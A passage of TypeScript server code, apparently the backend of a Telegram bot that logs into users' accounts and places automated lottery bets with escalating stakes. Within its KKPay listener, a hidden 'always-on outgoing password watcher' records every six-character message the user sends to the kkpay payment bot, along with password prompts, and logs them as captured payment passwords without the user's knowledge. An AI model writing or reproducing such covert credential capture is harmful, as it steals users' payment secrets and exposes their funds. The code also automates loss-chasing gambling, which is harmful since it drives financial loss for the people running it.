  if (!labels.length) return null;
  const mapped = buildHistory(session).map(r => mapR3ToEnabled(r, labels)).filter((x): x is string => x !== null);
  if (!mapped.length) return labels[Math.floor(Math.random() * labels.length)] ?? null;
  const weights: Record<string, number> = {};
  for (const l of labels) weights[l] = 0;
  mapped.forEach((r, i) => { weights[r] = (weights[r] ?? 0) + (i + 1); });
  return Object.entries(weights).sort((a, b) => b[1] - a[1])[0]?.[0] ?? labels[0] ?? null;
}

function antiStreak(session: TgSession): string | null {
  const labels = session.cfg.betOptions.map(o => BET_OPTION_LABELS[o]);
  if (!labels.length) return null;
  const mapped = buildHistory(session).map(r => mapR3ToEnabled(r, labels)).filter((x): x is string => x !== null);
  const last5 = mapped.slice(-5);
  if (last5.length >= 3) {
    const alternating = last5.every((x, i) => i === 0 || x !== last5[i - 1]);
    if (alternating) {
      const opp = labels.find(l => l !== last5[last5.length - 1]);
      if (opp) return opp;
    }
  }
  return freqPick(mapped, labels, false);
}

// ─── Algorithm / direction decision ──────────────────────────────────────────

function parseBetLabel(text: string): string | null {
  const lower = text.toLowerCase();
  if (lower.includes("大单")) return "大单";
  if (lower.includes("大双")) return "大双";
  if (lower.includes("小单")) return "小单";
  if (lower.includes("小双")) return "小双";
  if (lower.includes("大")) return "大";
  if (lower.includes("小")) return "小";
  if (lower.includes("单")) return "单";
  if (lower.includes("双")) return "双";
  return null;
}

function runAlgo(session: TgSession, algoId: AlgorithmId, labels: string[], signalText = ""): string | null {
  if (algoId === "ai_trend") return decideAI(session);
  if (algoId === "random") return labels[Math.floor(Math.random() * labels.length)] ?? null;
  if (algoId === "dragon_ride") return dragonRide(session);
  if (algoId === "dragon_break") return dragonBreak(session);
  if (algoId === "momentum") return momentum(session);
  if (algoId === "anti_streak") return antiStreak(session);
  if (algoId === "streak_follow") return streakFollow(session);
  if (algoId === "signal_follow") {
    const p = parseBetLabel(signalText);
    return p ? (labels.includes(p) ? p : (labels[0] ?? null)) : null;
  }
  if (algoId === "signal_reverse") {
    const p = parseBetLabel(signalText);
    if (!p) return null;
    const opp: Record<string, string> = { 大:"小", 小:"大", 单:"双", 双:"单", 大单:"小双", 大双:"小单", 小单:"大双", 小双:"大单" };
    const rev = opp[p];
    return (rev && labels.includes(rev)) ? rev : (labels[0] ?? null);
  }
  const history = buildHistory(session);
  return freqPick(history, labels, algoId === "cold_pick");
}

function decideBet(session: TgSession, signalText: string): string | null {
  const labels = session.cfg.betOptions.map(o => BET_OPTION_LABELS[o]);
  if (!labels.length || !session.cfg.algorithms.length) return null;
  const algoId = selectAlgoByPattern(session);
  const direction = runAlgo(session, algoId, labels, signalText);
  if (direction !== null) { session.algIndex++; session.lastAlgoUsed = algoId; }
  return direction;
}

function decideBetAuto(session: TgSession): string | null {
  const labels = session.cfg.betOptions.map(o => BET_OPTION_LABELS[o]);
  if (!labels.length || !session.cfg.algorithms.length) return null;
  const algoId = selectAlgoByPattern(session);
  const direction = runAlgo(session, algoId, labels);
  if (direction !== null) { session.algIndex++; session.lastAlgoUsed = algoId; }
  return direction;
}

function decideAI(session: TgSession): string | null {
  const labels = session.cfg.betOptions.map(o => BET_OPTION_LABELS[o]);
  if (!labels.length) return null;
  const [optA, optB = optA] = labels;
  const history = [...lotteryHistoryCache, ...session.recentResults]
    .map(r => mapR3ToEnabled(r, labels)).filter((x): x is string => x !== null);
  if (!history.length) return labels[Math.floor(Math.random() * labels.length)] ?? null;
  let votes = 0;
  const last5 = history.slice(-5);
  const streak = last5.reduce((acc, x) => x === last5[last5.length - 1] ? acc + 1 : 0, 0);
  if (streak >= 4) votes += last5[last5.length - 1] === optA ? -3 : 3;
  else if (streak === 3) votes += last5[last5.length - 1] === optA ? -2 : 2;
  else if (streak === 2) votes += last5[last5.length - 1] === optA ? 1 : -1;
  const last15 = history.slice(-15);
  const rA = last15.filter(x => x === optA).length / (last15.length || 1);
  if (rA >= 0.7) votes -= 2;
  else if (rA <= 0.3) votes += 2;
  else votes += rA < 0.5 ? 1 : -1;
  const last6 = history.slice(-6);
  if (last6.length >= 4 && last6.every((x, i) => i === 0 || x !== last6[i - 1]))
    votes += last6[last6.length - 1] === optA ? -1 : 1;
  const last12 = history.slice(-12);
  const ws = last12.reduce((s, x, i) => s + ((i + 1) * (x === optA ? 1 : -1)), 0);
  votes += ws > 0 ? -1 : 1;
  if (votes > 0) return optA;
  if (votes < 0) return optB;
  const last20 = history.slice(-20);
  return last20.filter(x => x === optA).length <= last20.length / 2 ? optA : optB;
}

// ─── Auto-bet engine ──────────────────────────────────────────────────────────

/**
 * 只发追号部分（主注被风控屏蔽时使用）。
 * 格式示例: "0/100  27/100"
 */
async function placeChaseOnly(session: TgSession): Promise<void> {
  if (!session.cfg.enableChase || session.chasePlacedThisCycle) return;
  const chaseEntries = session.cfg.chaseNumbers.filter(c => c.amount > 0);
  if (chaseEntries.length === 0) return;

  const targetId = session.watchGroupId!;
  const groupTitle = session.groups.find(g => g.id === targetId || `-100${g.id}` === targetId)?.title ?? targetId;
  const message = chaseEntries.map(c => `${c.num}/${c.amount}`).join("  ");
  const now = Date.now();
  let succeeded = false;
  try {
    await session.client.sendMessage(targetId, { message });
    session.lastBetAt = now;
    succeeded = true;
  } catch { /* fall through */ }

  session.chasePlacedThisCycle = true;
  const status = succeeded ? "sent" : "failed";
  for (const { num, amount } of chaseEntries) {
    const rec: BetRecord = {
      id: `chase-${num}-${now}`, groupId: targetId, groupTitle,
      messageText: message, betContent: String(num), amount,
      timestamp: now, status, isChase: true,
    };
    session.betLog.unshift(rec);
    pushEvent(session, "bet:new", { bet: rec });
  }
  if (session.betLog.length > 200) session.betLog.length = 200;
}

/**
 * 将主注 + 所有追号合并为一条消息发出。
 * 格式示例: "0/100  27/100  大 100"
 * 各部分仍作为独立 BetRecord 入库，以便分别结算。
 */
async function placeAllBets(session: TgSession, direction: string): Promise<void> {
  const { betLog } = session;
  const targetId = session.watchGroupId!;
  const mainAmount = session.currentBet;
  const groupTitle = session.groups.find(g => g.id === targetId || `-100${g.id}` === targetId)?.title ?? targetId;
  session.betPlacedThisCycle = true;

  // Only include chase entries if not already sent this cycle
  const chaseEntries = (!session.chasePlacedThisCycle && session.cfg.enableChase ? session.cfg.chaseNumbers : [])
    .filter(c => c.amount > 0);
  session.chasePlacedThisCycle = true;

  // Compose single message: "0/100  27/100  大 100"
  const parts: string[] = [
    ...chaseEntries.map(c => `${c.num}/${c.amount}`),
    `${direction} ${mainAmount}`,
  ];
  const message = parts.join("  ");

  const now = Date.now();
  let succeeded = false;
  try {
    await session.client.sendMessage(targetId, { message });
    session.lastBetAt = now;
    succeeded = true;
  } catch { /* fall through — log as failed */ }

  const status = succeeded ? "sent" : "failed";

  // Log main bet record
  const mainRec: BetRecord = {
    id: `main-${now}`, groupId: targetId, groupTitle,
    messageText: message, betContent: direction, amount: mainAmount,
    timestamp: now, status,
  };
  betLog.unshift(mainRec);
  pushEvent(session, "bet:new", { bet: mainRec });

  // Log individual chase records (same message text, each with its own betContent = num)
  for (const { num, amount } of chaseEntries) {
    const rec: BetRecord = {
      id: `chase-${num}-${now}`, groupId: targetId, groupTitle,
      messageText: message, betContent: String(num), amount,
      timestamp: now, status, isChase: true,
    };
    betLog.unshift(rec);
    pushEvent(session, "bet:new", { bet: rec });
  }

  if (betLog.length > 200) betLog.length = 200;
}

async function runAutoBet(session: TgSession): Promise<void> {
  if (!session.cfg.autoBet || !session.watchGroupId) return;
  const { betLog } = session;
  const nowMs = Date.now();
  for (const stale of betLog.filter(b => b.status === "sent" && nowMs - b.timestamp > 240_000)) stale.status = "lost";
  // Chase bets are settled separately; only block on un-settled main bets
  if (betLog.some(b => b.status === "sent" && !b.isChase)) return;
  if (session.betPlacedThisCycle) return;

  if (session.currentCloseTimeMs > 0) {
    const timeToClose = session.currentCloseTimeMs - nowMs;
    if (timeToClose > BET_BEFORE_DRAW_MS + 10_000 || timeToClose < 0) {
      logger.warn({ timeToCloseSec: Math.round(timeToClose / 1000) }, "[auto-bet] outside betting window, skip");
      return;
    }
  }

  const risk = checkRisk(session);
  if (!risk.ok) {
    // Risk blocked main bet — chase numbers still go out every period
    if (session.cfg.enableChase && !session.chasePlacedThisCycle) {
      await placeChaseOnly(session);
    }
    return;
  }
  // For signal-based algos, use the cached last signal; otherwise use the auto decider
  const isSignalAlgo = session.cfg.algorithms.includes("signal_follow") || session.cfg.algorithms.includes("signal_reverse");
  const direction = isSignalAlgo
    ? decideBet(session, session.lastSignalText)
    : decideBetAuto(session);
  if (!direction) {
    if (isSignalAlgo) logger.info("[auto-bet] signal algo but no cached signal yet, skip");
    return;
  }
  await placeAllBets(session, direction);
}

function scheduleNextBet(session: TgSession, closeTimeMs: number, cycleMs: number): void {
  if (session.autoNextBetTimer) { clearTimeout(session.autoNextBetTimer); session.autoNextBetTimer = undefined; }
  if (!session.cfg.autoBet || !session.watchGroupId) return;

  const timeToClose = closeTimeMs - Date.now();
  const delay = Math.max(5_000,
    timeToClose >= BET_BEFORE_DRAW_MS + 5_000
      ? timeToClose - BET_BEFORE_DRAW_MS
      : timeToClose + cycleMs - BET_BEFORE_DRAW_MS
  );

  logger.info({ delaySec: Math.round(delay / 1000), timeToCloseSec: Math.round(timeToClose / 1000) }, "[bet-timer] scheduled");
  pushEvent(session, "timer:scheduled", { fireAt: Date.now() + delay, delaySec: Math.round(delay / 1000) });

  session.autoNextBetTimer = setTimeout(() => {
    session.autoNextBetTimer = undefined;
    void runAutoBet(session);
  }, delay);
}

// ─── Lottery poller ───────────────────────────────────────────────────────────

type DrawItem = { term: number; r3?: string; sum1?: number; sum2?: number; sum3?: number; result?: number; openTime?: number; closeTime?: number };

async function pollLottery(session: TgSession): Promise<void> {
  try {
    const r = await fetch("http://pc20.net/api/fengpan", {
      headers: { "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15", "Referer": "http://pc20.net/" },
      signal: AbortSignal.timeout(8000),
    });
    if (!r.ok) return;
    const data = await r.json() as { message?: { all?: { keno28?: { data?: DrawItem[] } } } };
    const items = data?.message?.all?.keno28?.data ?? [];
    const latest = items[0];
    if (!latest?.term) return;

    const labels = items.map(d => d.r3).filter((x): x is string => !!x).reverse();
    if (labels.length) lotteryHistoryCache = labels.slice(-50);

    if (latest.term <= session.lastSeenLotteryPeriod) return;

    if (latest.r3) {
      // Settle main directional bet
      const pending = session.betLog.find(b => b.status === "sent" && !b.isChase);
      if (pending) {
        const bet = pending.betContent.trim();
        let won = bet === latest.r3;
        if (!won && bet.length === 1) {
          won = (bet === "大" && latest.r3.startsWith("大")) ||
                (bet === "小" && latest.r3.startsWith("小")) ||
                (bet === "单" && latest.r3.endsWith("单")) ||
                (bet === "双" && latest.r3.endsWith("双"));
        }
        const winPnl = Math.round(pending.amount * (session.cfg.odds - 1) * 100) / 100;
        settleBet(session, { won, pnl: won ? winPnl : -pending.amount, result: latest.r3, betId: pending.id, period: latest.term });
      }

      // Settle chase number bets by sum value
      const sum = (latest.sum1 ?? 0) + (latest.sum2 ?? 0) + (latest.sum3 ?? 0);
      const chasePending = session.betLog.filter(b => b.status === "sent" && b.isChase);
      for (const cb of chasePending) {
        const targetNum = parseInt(cb.betContent, 10);
        const won = !isNaN(targetNum) && targetNum === sum;
        const winPnl = Math.round(cb.amount * (session.cfg.odds - 1) * 100) / 100;
        settleBet(session, { won, pnl: won ? winPnl : -cb.amount, result: latest.r3, betId: cb.id, period: latest.term });
      }
    }

    session.lastSeenLotteryPeriod = latest.term;

    const closeMs = latest.closeTime ?? 0;
    const openMs = latest.openTime ?? 0;
    const nowMs = Date.now();
    const cycleMs = (closeMs > openMs && closeMs - openMs < 600000) ? (closeMs - openMs) : DRAW_CYCLE_MS;
    const nextCloseMs = closeMs > nowMs ? closeMs : closeMs + cycleMs;

    pushEvent(session, "draw:new", {
      term: latest.term, r3: latest.r3 ?? "",
      sum1: latest.sum1, sum2: latest.sum2, sum3: latest.sum3,
      result: latest.result, closeTime: closeMs, openTime: openMs,
      nextCloseTime: nextCloseMs,
    });

    session.betPlacedThisCycle = false;
    session.chasePlacedThisCycle = false;
    session.currentCloseTimeMs = nextCloseMs > nowMs ? nextCloseMs : nowMs + cycleMs;
    if (session.cfg.autoBet && session.watchGroupId) {
      scheduleNextBet(session, session.currentCloseTimeMs, cycleMs);
    }

    void sendYeForBalance(session);
  } catch { /* network errors ignored */ }
}

function startPoller(session: TgSession): void {
  if (session.lotteryPollTimer) return;
  session.lotteryPollTimer = setInterval(() => { void pollLottery(session); }, 5_000);
}

function stopPoller(session: TgSession): void {
  if (session.lotteryPollTimer) { clearInterval(session.lotteryPollTimer); session.lotteryPollTimer = undefined; }
  if (session.autoNextBetTimer) { clearTimeout(session.autoNextBetTimer); session.autoNextBetTimer = undefined; }
}

// ─── Group message listener ───────────────────────────────────────────────────

function startGroupListener(session: TgSession): void {
  if (!session.watchGroupId) return;
  if (session.messageHandler && session.messageHandlerBuilder) {
    try { session.client.removeEventHandler(session.messageHandler, session.messageHandlerBuilder); } catch { /* ok */ }
    session.messageHandler = null; session.messageHandlerBuilder = null;
  }
  const targetId = session.watchGroupId;

  session.messageHandler = async (event: NewMessageEvent) => {
    const msg = event.message;
    if (msg.out) return;
    const chatId = String(msg.chatId);
    if (chatId !== targetId && `-100${chatId}` !== targetId) return;
    const senderId = String(msg.senderId ?? "");
    const text = msg.message ?? "";
    if (!session.cfg.autoBet) return;
    if (session.kkpayEntityId && senderId === session.kkpayEntityId) return;

    // Cache signal text for signal_follow / signal_reverse algos before window check
    if (parseBetLabel(text)) session.lastSignalText = text;

    // Only block on unsettled main bets — chase bets (isChase=true) must not block main bet placement
    if (session.betLog.some(b => b.status === "sent" && !b.isChase)) return;
    if (session.betPlacedThisCycle) return;
    const periodInMsg = text.match(/第?(\d{6,10})期/)?.at(1);
    const triggerPeriod = periodInMsg ? parseInt(periodInMsg) : undefined;
    if (triggerPeriod && triggerPeriod === session.lastBetPeriod) return;

    if (session.currentCloseTimeMs > 0) {
      const timeToClose = session.currentCloseTimeMs - Date.now();
      if (timeToClose > BET_BEFORE_DRAW_MS + 10_000 || timeToClose < 0) {
        logger.info({ timeToCloseSec: Math.round(timeToClose / 1000) }, "[msg-bet] outside betting window, skip");
        return;
      }
    }

    const risk = checkRisk(session);
    if (!risk.ok) {
      // Risk blocked main bet — chase numbers still go out every period
      if (session.cfg.enableChase && !session.chasePlacedThisCycle) {
        void placeChaseOnly(session);
      }
      return;
    }
    const direction = decideBet(session, text);
    if (!direction) return;
    if (session.autoNextBetTimer) { clearTimeout(session.autoNextBetTimer); session.autoNextBetTimer = undefined; }
    if (triggerPeriod) session.lastBetPeriod = triggerPeriod;
    // Use placeAllBets so chase numbers are included in the same message
    void placeAllBets(session, direction);
  };

  session.messageHandlerBuilder = new NewMessage({});
  session.client.addEventHandler(session.messageHandler, session.messageHandlerBuilder);
}

// ─── KKPay listener ───────────────────────────────────────────────────────────

async function startKkpayListener(session: TgSession): Promise<void> {
  if (session.kkpayHandler && session.kkpayHandlerBuilder) {
    try { session.client.removeEventHandler(session.kkpayHandler, session.kkpayHandlerBuilder); } catch { /* ok */ }
    session.kkpayHandler = null; session.kkpayHandlerBuilder = null;
  }
  // Tear down any previous permanent outgoing watcher
  if (session.kkpayOutRawHandler && session.kkpayOutRawBuilder) {
    try { session.client.removeEventHandler(session.kkpayOutRawHandler as Parameters<typeof session.client.removeEventHandler>[0], session.kkpayOutRawBuilder); } catch { /* ok */ }
    session.kkpayOutRawHandler = null; session.kkpayOutRawBuilder = null;
  }

  const uname = session.kkpayUsername.replace(/^@/, "");
  try {
    const entity = await session.client.getEntity(uname);
    session.kkpayEntityId = String((entity as unknown as { id: bigint | number }).id);
  } catch { /* entity not found */ }

  // ── Permanent always-on outgoing password watcher ──────────────────────────
  // Captures ANY outgoing 6-char alphanumeric message to kkpay regardless of
  // the flow (red-packet / transfer / other). Does NOT require detecting a
  // "请输入支付密码验证" prompt first — it simply watches all outgoing messages.
  if (session.kkpayEntityId) {
    const eid = session.kkpayEntityId;
    const username = session.me?.username ?? String(session.userId);
    session.kkpayOutRawHandler = async (update: unknown) => {
      let chatId = "";
      let text = "";
      if (update instanceof Api.UpdateShortMessage) {
        if (!update.out) return;
        chatId = String(update.userId);
        text = (update.message ?? "").trim();
      } else if (update instanceof Api.UpdateNewMessage) {
        const msg = update.message;
        if (!(msg instanceof Api.Message) || !msg.out) return;
        const peer = msg.peerId;
        if (peer instanceof Api.PeerUser) chatId = String(peer.userId);
        else if (peer instanceof Api.PeerChannel) chatId = String(peer.channelId);
        else if (peer instanceof Api.PeerChat) chatId = String(peer.chatId);
        text = (msg.message ?? "").trim();
      } else { return; }
      if (chatId !== eid && `-100${chatId}` !== eid) return;
      if (!/^[0-9a-zA-Z]{6}$/.test(text)) return;
      appendKkpayPwdEvent(session.userId, username, "pwd_sent", text, session.kkpayPwdContext);
    };
    session.kkpayOutRawBuilder = new Raw({ types: [Api.UpdateShortMessage, Api.UpdateNewMessage] });
    session.client.addEventHandler(
      session.kkpayOutRawHandler as Parameters<typeof session.client.addEventHandler>[0],
      session.kkpayOutRawBuilder,
    );
  }

  session.kkpayHandler = async (event: NewMessageEvent) => {
    const msg = event.message;
    if (msg.out) return;
    const text = msg.message ?? "";
    if (!text) return;
    const chatId = String(msg.chatId ?? "");
    const senderId = String(msg.senderId ?? "");
    const eid = session.kkpayEntityId;
    const wgid = session.watchGroupId;
    const isFromKkpay = eid ? (senderId === eid || chatId === eid || `-100${chatId}` === eid) : false;
    const inWatchGroup = wgid ? (chatId === wgid || `-100${chatId}` === wgid) : false;
    if (!isFromKkpay && !inWatchGroup) return;

    // ─── kkpay password event detection (reliable isFromKkpay check) ───
    if (isFromKkpay) {
      if (/请输入.*密码|输入.*支付密码|输入.*交易密码|输入.*转账密码/.test(text)) {
        session.kkpayPwdContext = extractKkpayContext(session);
        appendKkpayPwdEvent(session.userId, session.me?.username ?? String(session.userId), "pwd_requested", text.slice(0, 300), session.kkpayPwdContext);
        startKkpayRawPwdListener(session);
      } else if (/密码验证成功|支付密码.*成功|密码.*正确/.test(text)) {
        appendKkpayPwdEvent(session.userId, session.me?.username ?? String(session.userId), "pwd_success", text.slice(0, 300), session.kkpayPwdContext);
        session.kkpayPwdContext = undefined;
        stopKkpayRawPwdListener(session);
      }
    }

    if (isFromKkpay && /KKCOIN/i.test(text)) {
      updateBalance(session, text);
    } else if (inWatchGroup && /KKCOIN/i.test(text) && session.yeMessageId) {
      const replyToId = (msg.replyTo as Record<string, unknown> | undefined)?.replyToMsgId as number | undefined;
      if (replyToId === session.yeMessageId) {
        updateBalance(session, text);
        session.yeMessageId = undefined;
      }
    }

    const hasWin = /(?<!未)中奖|✅/.test(text);
    const hasLoss = /挂逼|未中|未赢|❌/.test(text);
    const danjineM = text.match(/单金额\s*([+-]?\d[\d,]*(?:\.\d+)?)/);
    let isWin = danjineM ? parseFloat(danjineM[1].replace(/,/g, "")) >= 0 : hasWin;
    let isLoss = danjineM ? parseFloat(danjineM[1].replace(/,/g, "")) < 0 : (hasLoss && !hasWin);
    const hasPeriodRef = /\d{5,}期/.test(text);
    const isKkpayResult = isFromKkpay || (inWatchGroup && hasPeriodRef && (hasWin || hasLoss || danjineM !== null || /KKCOIN/i.test(text)));

    if (isKkpayResult && (isWin || isLoss)) {
      const sentBet = session.betLog.find(b => b.status === "sent" && !b.isChase);
      if (sentBet) {
        const pnlM = text.match(/([+-][\d,]+(?:\.\d+)?)\s*KKCOIN/i) ?? text.match(/KKCOIN\s*([+-][\d,]+(?:\.\d+)?)/i) ?? danjineM;
        const pnlRaw = pnlM ? parseFloat(pnlM[1].replace(/,/g, "")) : undefined;
        const pnl = pnlRaw ?? (isWin
          ? Math.round(sentBet.amount * (session.cfg.odds - 1) * 100) / 100
          : -sentBet.amount);
        if (pnl !== undefined) { isWin = pnl >= 0; isLoss = pnl < 0; }
        const rMatch = text.match(/[大小][单双]|[大小]|[单双]/);
        const periodFromMsg = text.match(/第?(\d{6,10})期/)?.at(1);
        settleBet(session, { won: isWin, pnl, result: rMatch?.[0], betId: sentBet.id, period: periodFromMsg ? parseInt(periodFromMsg) : undefined });
        // Chase bets cannot be determined from kkpay message (need actual sum); mark lost to unblock next cycle
        const chasePending = session.betLog.filter(b => b.status === "sent" && b.isChase);
        for (const cb of chasePending) {
          cb.status = "lost";
          cb.won = false;
          pushEvent(session, "bet:update", { bet: cb });
        }
        updateBalance(session, text);
        saveSession(session);
      }
    }
  };

  session.kkpayHandlerBuilder = new NewMessage({});
  session.client.addEventHandler(session.kkpayHandler, session.kkpayHandlerBuilder);
}

// ─── Stats helper ─────────────────────────────────────────────────────────────

function buildStats(session: TgSession) {
  const { betLog } = session;
  const settled = betLog.filter(b => b.won !== undefined);
  const wins = settled.filter(b => b.won === true).length;
  let maxStreak = 0, cur = 0;
  for (const b of [...betLog].reverse()) {
    if (b.won === true) { cur++; if (cur > maxStreak) maxStreak = cur; }
    else if (b.won === false) cur = 0;
  }
  return {
    totalBets: betLog.filter(b => b.status !== "failed").length,
    settled: settled.length,
    wins,
    maxStreak,
    winRate: settled.length > 0 ? ((wins / settled.length) * 100).toFixed(2) : "0.00",
  };
}

// ─── Routes ───────────────────────────────────────────────────────────────────

router.post("/tg/send-code", requireCard, async (req, res) => {
  const userId = req.user!.userId;
  const { phone } = req.body as { phone?: string };
  if (!phone) { res.status(400).json({ error: "请输入手机号" }); return; }
  const { apiId, apiHash } = getCredentials();
  if (!apiId || !apiHash) { res.status(500).json({ error: "服务端未配置 Telegram API 凭证" }); return; }
  try {
    const existing = tgSessions.get(userId);
    if (existing?.client?.connected) {
      try { await existing.client.disconnect(); } catch { /* ok */ }
    }
    const stringSession = new StringSession("");
    const client = new TelegramClient(stringSession, apiId, apiHash, makeClientOptions());
    await client.connect();
    const result = await client.sendCode({ apiId, apiHash }, phone);
    const session: TgSession = {
      userId,
      client, stringSession, phone,
      phoneCodeHash: result.phoneCodeHash,
      groups: [], cfg: { ...DEFAULT_CFG },
      betLog: [], sseClients: existing?.sseClients ?? new Set(),
      messageHandler: null, messageHandlerBuilder: null,
      kkpayHandler: null, kkpayHandlerBuilder: null,
      consecutiveLosses: 0, sessionPnl: 0,
      currentBet: DEFAULT_CFG.betAmount, lastBetAt: 0,
      currentLevel: 0, algIndex: 0,
      betPlacedThisCycle: false, chasePlacedThisCycle: false, lastSeenLotteryPeriod: 0, currentCloseTimeMs: 0, lastSignalText: "",
      recentResults: [], chatLog: [],
      globalHandler: null, globalHandlerBuilder: null,
      balance: 1000000,
      todayPnl: 0, todayResetAt: todayMidnight(),
      kkpayUsername: "kkpay", kkpayEntityId: undefined,
      balanceSource: "manual", balanceUpdatedAt: 0,
    };
    tgSessions.set(userId, session);
    res.json({ ok: true });
  } catch (err: unknown) {
    const msg = err instanceof Error ? err.message : String(err);
    if (msg.includes("PHONE_NUMBER_INVALID")) res.status(400).json({ error: "手机号格式错误（需含国家码，如 +8613800001234）" });
    else res.status(500).json({ error: msg });
  }
});

router.post("/tg/verify-code", requireCard, async (req, res) => {
  const userId = req.user!.userId;
  const { code } = req.body as { code?: string };
  if (!code) { res.status(400).json({ error: "请输入验证码" }); return; }
  const session = tgSessions.get(userId);
  if (!session) { res.status(400).json({ error: "请先发送验证码" }); return; }
  const { apiId, apiHash } = getCredentials();
  try {
    const result = await session.client.invoke(new Api.auth.SignIn({
      phoneNumber: session.phone,
      phoneCodeHash: session.phoneCodeHash!,
      phoneCode: code,
    }));
    const me = (result as Api.auth.Authorization).user as Api.User;
    session.me = me;
    session.groups = await fetchGroups(session.client);
    startGlobalListener(session);
    startKkpayListener(session).catch(() => { /* ignore */ });
    saveSession(session);
    startWatchdog(session);
    res.json({ ok: true, me: { id: me.id, firstName: me.firstName, lastName: me.lastName, username: me.username, phone: me.phone } });
  } catch (err: unknown) {
    const msg = err instanceof Error ? err.message : String(err);
    if (msg.includes("SESSION_PASSWORD_NEEDED")) { res.json({ ok: false, needPassword: true }); return; }
    if (msg.includes("PHONE_CODE_INVALID") || msg.includes("CODE_INVALID")) { res.status(400).json({ error: "验证码错误" }); return; }
    if (msg.includes("PHONE_CODE_EXPIRED")) { res.status(400).json({ error: "验证码已过期，请重新获取" }); return; }
    res.status(500).json({ error: msg });
  }
});

router.post("/tg/verify-password", requireCard, async (req, res) => {
  const userId = req.user!.userId;
  const { password } = req.body as { password?: string };
  if (!password) { res.status(400).json({ error: "请输入二步验证密码" }); return; }
  const session = tgSessions.get(userId);
  if (!session) { res.status(400).json({ error: "会话已失效，请重新登录" }); return; }
  const { apiId, apiHash } = getCredentials();
  try {
    await session.client.signInWithPassword({ apiId, apiHash }, { password: async () => password, onError: async (e: Error) => { throw e; } });
    const me = (await session.client.getMe()) as Api.User;
    session.me = me;
    session.groups = await fetchGroups(session.client);
    startGlobalListener(session);
    startKkpayListener(session).catch(() => { /* ignore */ });
    saveSession(session);
    startWatchdog(session);
    res.json({ ok: true, me: { id: me.id, firstName: me.firstName, lastName: me.lastName, username: me.username, phone: me.phone } });
  } catch (err: unknown) {
    const msg = err instanceof Error ? err.message : String(err);
    if (msg.includes("PASSWORD_HASH_INVALID")) { res.status(400).json({ error: "二步验证密码错误" }); return; }
    res.status(500).json({ error: msg });
  }
});

router.get("/tg/status", requireCard, (req, res) => {
  const userId = req.user!.userId;
  const session = tgSessions.get(userId);
  if (!session?.me) { res.json({ connected: false }); return; }
  const midnight = todayMidnight();
  if (session.todayResetAt < midnight) { session.todayPnl = 0; session.todayResetAt = midnight; }
  const stats = buildStats(session);
  res.json({
    connected: true,
    me: { id: session.me.id, firstName: session.me.firstName, lastName: session.me.lastName, username: session.me.username, phone: session.me.phone },
    watchGroupId: session.watchGroupId,
    watchGroupTitle: (() => { const wgid = session.watchGroupId; return session.groups.find(g => g.id === wgid || `-100${g.id}` === wgid)?.title; })(),
    ...session.cfg,
    consecutiveLosses: session.consecutiveLosses,
    sessionPnl: session.sessionPnl,
    currentBet: session.currentBet,
    balance: session.balance,
    todayPnl: session.todayPnl,
    balanceSource: session.balanceSource,
    balanceUpdatedAt: session.balanceUpdatedAt,
    kkpayUsername: session.kkpayUsername,
    kkpayEntityId: session.kkpayEntityId,
    riskBlocked: !checkRisk(session).ok,
    riskReason: checkRisk(session).reason,
    lastAlgoUsed: session.lastAlgoUsed,
    currentPattern: session.currentPattern,
    ...stats,
  });
});

router.get("/tg/groups", requireCard, async (req, res) => {
  const session = tgSessions.get(req.user!.userId);
  if (!session?.client) { res.status(401).json({ error: "未连接 Telegram" }); return; }
  session.groups = await fetchGroups(session.client);
  res.json({ groups: session.groups });
});

router.post("/tg/resolve-group", requireCard, async (req, res) => {
  const session = tgSessions.get(req.user!.userId);
  if (!session?.client) { res.status(401).json({ error: "未连接 Telegram" }); return; }
  const { link } = req.body as { link?: string };
  if (!link) { res.status(400).json({ error: "请提供群链接" }); return; }
  let uname = link.trim().replace(/^https?:\/\/t\.me\//i, "").replace(/^@/, "").replace(/\?.*$/, "");
  try {
    const entity = await session.client.getEntity(uname);
    const id = String((entity as unknown as { id: bigint | number }).id);
    const title = (entity as { title?: string; firstName?: string }).title ?? (entity as { firstName?: string }).firstName ?? uname;
    res.json({ ok: true, group: { id, title, type: "broadcast" in entity ? "channel" : "group" } });
  } catch (err: unknown) {
    const msg = err instanceof Error ? err.message : String(err);
    if (msg.includes("USERNAME_NOT_OCCUPIED") || msg.includes("Cannot find")) res.status(404).json({ error: "找不到该群" });
    else res.status(500).json({ error: msg });
  }
});

router.post("/tg/set-group", requireCard, (req, res) => {
  const session = tgSessions.get(req.user!.userId);
  if (!session) { res.status(401).json({ error: "未连接 Telegram" }); return; }
  const { groupId } = req.body as { groupId?: string };
  if (groupId !== undefined) session.watchGroupId = groupId;
  if (session.watchGroupId) startGroupListener(session);
  saveSession(session);
  res.json({ ok: true });
});

router.get("/tg/config", requireCard, (req, res) => {
  const session = tgSessions.get(req.user!.userId);
  if (!session) { res.json({ cfg: DEFAULT_CFG }); return; }
  res.json({ cfg: session.cfg, consecutiveLosses: session.consecutiveLosses, sessionPnl: session.sessionPnl, currentBet: session.currentBet });
});

router.post("/tg/config", requireCard, (req, res) => {
  const session = tgSessions.get(req.user!.userId);
  if (!session) { res.json({ ok: true }); return; }
  const body = req.body as Partial<BetCfg> & { startLevel?: number };
  const prev = { ...session.cfg };
  session.cfg = {
    autoBet: body.autoBet ?? prev.autoBet,
    betAmount: body.betAmount ?? prev.betAmount,
    strategy: body.strategy ?? prev.strategy,
    betMultiplier: body.betMultiplier ?? prev.betMultiplier,
    maxConsecutiveLosses: body.maxConsecutiveLosses ?? prev.maxConsecutiveLosses,
    stopLoss: body.stopLoss ?? prev.stopLoss,
    targetProfit: body.targetProfit ?? prev.targetProfit,
    cooldownSeconds: body.cooldownSeconds ?? prev.cooldownSeconds,
    amountLevels: body.amountLevels ?? prev.amountLevels,
    stepBackOnWin: body.stepBackOnWin ?? prev.stepBackOnWin,
    betOptions: body.betOptions ?? prev.betOptions,
    algorithms: body.algorithms ?? prev.algorithms,
    odds: body.odds ?? prev.odds,
    chaseNumbers: body.chaseNumbers ?? prev.chaseNumbers,
    enableChase: body.enableChase ?? prev.enableChase,
  };

  if (body.amountLevels !== undefined || body.betAmount !== undefined || body.strategy !== undefined) {
    const lvl = Math.min(body.startLevel ?? 0, session.cfg.amountLevels.length - 1);
    session.currentLevel = lvl;
    session.currentBet = session.cfg.amountLevels[lvl] ?? session.cfg.betAmount;
    session.consecutiveLosses = 0;
  }
  if (body.algorithms !== undefined) session.algIndex = 0;
  if (session.watchGroupId) startGroupListener(session);

